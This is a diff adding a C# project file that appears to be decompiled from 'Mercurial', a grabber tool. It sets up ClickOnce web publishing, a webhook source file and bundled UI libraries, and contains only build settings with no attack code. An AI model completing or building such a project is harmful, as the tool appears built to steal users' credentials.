@@ -1,0 +1,143 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="4.0" DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <!--Project was exported from assembly: C:\Users\thele\Downloads\Mercurial-Grabber-master\Mercurial-Grabber-master\Mercurial\Mercurial.exe-->
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
+    <ProjectGuid>{A18FE990-C17E-4389-912B-74C2ABEC053F}</ProjectGuid>
+    <OutputType>WinExe</OutputType>
+    <AssemblyName>Mercurial</AssemblyName>
+    <TargetFrameworkVersion>v4.7.2</TargetFrameworkVersion>
+    <FileAlignment>512</FileAlignment>
+    <RootNamespace>Mercurial</RootNamespace>
+    <IsWebBootstrapper>true</IsWebBootstrapper>
+    <PublishUrl>C:\Users\thele\Downloads\Mercurial Test\Mercurial Test\bin\Debug\</PublishUrl>
+    <Install>true</Install>
+    <InstallFrom>Web</InstallFrom>
+    <UpdateEnabled>true</UpdateEnabled>
+    <UpdateMode>Foreground</UpdateMode>
+    <UpdateInterval>7</UpdateInterval>
+    <UpdateIntervalUnits>Days</UpdateIntervalUnits>
+    <UpdatePeriodically>false</UpdatePeriodically>
+    <UpdateRequired>false</UpdateRequired>
+    <MapFileExtensions>true</MapFileExtensions>
+    <InstallUrl>https://github.com/yes133/Mercurial-Updated-2023-/blob/main/README.md/</InstallUrl>
+    <CreateWebPageOnPublish>true</CreateWebPageOnPublish>
+    <WebPage>publish.htm</WebPage>
+    <ApplicationRevision>0</ApplicationRevision>
+    <ApplicationVersion>1.0.0.0</ApplicationVersion>
+    <UseApplicationTrust>false</UseApplicationTrust>
+    <PublishWizardCompleted>true</PublishWizardCompleted>
+    <BootstrapperEnabled>true</BootstrapperEnabled>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <Optimize>false</Optimize>
+    <OutputPath>bin\Debug\</OutputPath>
+    <DefineConstants>DEBUG;TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugType>pdbonly</DebugType>
+    <Optimize>true</Optimize>
+    <OutputPath>bin\Release\</OutputPath>
+    <DefineConstants>TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+  </PropertyGroup>
+  <PropertyGroup>
+    <ManifestCertificateThumbprint>9054AB4601138D9A0923C4E5370090E2391BF257</ManifestCertificateThumbprint>
+  </PropertyGroup>
+  <PropertyGroup>
+    <ManifestKeyFile>Mercurial_TemporaryKey.pfx</ManifestKeyFile>
+  </PropertyGroup>
+  <PropertyGroup>
+    <GenerateManifests>true</GenerateManifests>
+  </PropertyGroup>
+  <PropertyGroup>
+    <SignManifests>true</SignManifests>
+  </PropertyGroup>
+  <ItemGroup>
+    <Reference Include="System" />
+    <Reference Include="System.Drawing" />
+    <Reference Include="System.Net.Http" />
+    <Reference Include="System.Windows.Forms" />
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="_003CModule_003E.cs" />
+    <Compile Include="Mercurial_ProcessedByFody.cs" />
+    <Compile Include="Costura\AssemblyLoader.cs" />
+    <Compile Include="Form1.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Program.cs" />
+    <Compile Include="Webhook.cs" />
+    <Compile Include="Properties\Resources.cs" />
+    <Compile Include="Properties\Settings.cs" />
+    <Compile Include="AssemblyInfo.cs" />
+  </ItemGroup>
+  <ItemGroup>
+    <EmbeddedResource Include="costura.metadata" />
+    <EmbeddedResource Include="costura\bunifu\licensing\dll.compressed" />
+    <EmbeddedResource Include="costura\bunifu\ui\winforms\1\5\3\dll.compressed" />
+    <EmbeddedResource Include="costura\bunifu\ui\winforms\bunifubutton\dll.compressed" />
+    <EmbeddedResource Include="costura\bunifu\ui\winforms\bunifucheckbox\dll.compressed" />
+    <EmbeddedResource Include="costura\bunifu\ui\winforms\bunifucircleprogress\dll.compressed" />
+    <EmbeddedResource Include="costura\bunifu\ui\winforms\bunifucolortransition\dll.compressed" />
+    <EmbeddedResource Include="costura\bunifu\ui\winforms\bunifudatagridview\dll.compressed" />
+    <EmbeddedResource Include="costura\bunifu\ui\winforms\bunifudatepicker\dll.compressed" />
+    <EmbeddedResource Include="costura\bunifu\ui\winforms\bunifudropdown\dll.compressed" />
+    <EmbeddedResource Include="costura\bunifu\ui\winforms\bunifuformdock\dll.compressed" />
+    <EmbeddedResource Include="costura\bunifu\ui\winforms\bunifugauge\dll.compressed" />
+    <EmbeddedResource Include="costura\bunifu\ui\winforms\bunifugradientpanel\dll.compressed" />
+    <EmbeddedResource Include="costura\bunifu\ui\winforms\bunifugroupbox\dll.compressed" />
+    <EmbeddedResource Include="costura\bunifu\ui\winforms\bunifuimagebutton\dll.compressed" />
+    <EmbeddedResource Include="costura\bunifu\ui\winforms\bunifulabel\dll.compressed" />
+    <EmbeddedResource Include="costura\bunifu\ui\winforms\bunifupages\dll.compressed" />
+    <EmbeddedResource Include="costura\bunifu\ui\winforms\bunifupanel\dll.compressed" />
+    <EmbeddedResource Include="costura\bunifu\ui\winforms\bunifupicturebox\dll.compressed" />
+    <EmbeddedResource Include="costura\bunifu\ui\winforms\bunifuprogressbar\dll.compressed" />
+    <EmbeddedResource Include="costura\bunifu\ui\winforms\bunifuradiobutton\dll.compressed" />
+    <EmbeddedResource Include="costura\bunifu\ui\winforms\bunifurating\dll.compressed" />
+    <EmbeddedResource Include="costura\bunifu\ui\winforms\bunifuscrollbar\dll.compressed" />
+    <EmbeddedResource Include="costura\bunifu\ui\winforms\bunifuseparator\dll.compressed" />
+    <EmbeddedResource Include="costura\bunifu\ui\winforms\bunifushadowpanel\dll.compressed" />
+    <EmbeddedResource Include="costura\bunifu\ui\winforms\bunifushapes\dll.compressed" />
+    <EmbeddedResource Include="costura\bunifu\ui\winforms\bunifuslider\dll.compressed" />
+    <EmbeddedResource Include="costura\bunifu\ui\winforms\bunifusnackbar\dll.compressed" />
+    <EmbeddedResource Include="costura\bunifu\ui\winforms\bunifutextbox\dll.compressed" />
+    <EmbeddedResource Include="costura\bunifu\ui\winforms\bunifutoggleswitch\dll.compressed" />
+    <EmbeddedResource Include="costura\bunifu\ui\winforms\bunifutooltip\dll.compressed" />
+    <EmbeddedResource Include="costura\bunifu\ui\winforms\bunifutransition\dll.compressed" />
+    <EmbeddedResource Include="costura\bunifu\ui\winforms\bunifuusercontrol\dll.compressed" />
+    <EmbeddedResource Include="costura\bunifu\ui\winforms\deprecated\dll.compressed" />
+    <EmbeddedResource Include="costura\costura\dll.compressed" />
+    <EmbeddedResource Include="costura\costura\pdb.compressed" />
+    <EmbeddedResource Include="costura\system\diagnostics\diagnosticsource\dll.compressed" />
+    <EmbeddedResource Include="exe.licenses" />
+    <EmbeddedResource Include="Form1.resx">
+      <SubType>Designer</SubType>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Properties\Resources.resx" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Mercurial_TemporaryKey.pfx" />
+  </ItemGroup>
+  <ItemGroup>
+    <BootstrapperPackage Include=".NETFramework,Version=v4.7.2">
+      <Visible>False</Visible>
+      <ProductName>Microsoft .NET Framework 4.7.2 %28x86 and x64%29</ProductName>
+      <Install>true</Install>
+    </BootstrapperPackage>
+    <BootstrapperPackage Include="Microsoft.Net.Framework.3.5.SP1">
+      <Visible>False</Visible>
+      <ProductName>.NET Framework 3.5 SP1</ProductName>
+      <Install>false</Install>
+    </BootstrapperPackage>
+  </ItemGroup>
+  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+</Project>
